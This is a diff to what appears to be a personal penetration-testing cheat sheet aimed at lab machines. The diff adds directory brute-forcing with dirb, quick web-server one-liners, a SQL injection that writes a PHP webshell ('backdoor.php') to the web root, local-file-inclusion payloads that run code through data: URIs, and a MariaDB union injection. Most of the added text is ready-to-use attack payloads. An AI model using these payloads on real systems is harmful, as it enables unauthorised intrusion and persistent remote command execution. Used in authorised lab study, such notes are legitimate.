@@ -27,6 +27,9 @@ nmap -sC -sV -p- -oA nmap/<box> 10.10.10.84
 #Web Vuln-Scan
 nikto -host 192.168.56.205
 
+#web enum brute
+dirb http://www.site.com -r -z 10
+
 #Web Enum BruteForce
 gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<host>
 https://github.com/danielmiessler/SecLists
@@ -231,6 +234,31 @@ echo $( php -r "echo urlencode('Start: #1, Zeichen {13/24} Ende();');"; )
 #!/bin/bash
 echo $( php -r "echo urlencode(\"$1\");"; )
 urlencode.sh 'string zum encodieren'
+```
+
+PHP
+```bash
+#build in webserver
+php -S 0.0.0.0:8000
+
+# create sqli to php webshell
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+```
+
+Busybox
+```bash
+busybox httpd -f -p 10000
+```
+
+LFI
+```bash
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+```
+
+MARIADB SQLi
+```bash
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
 ```
 
 PERSISTENCE
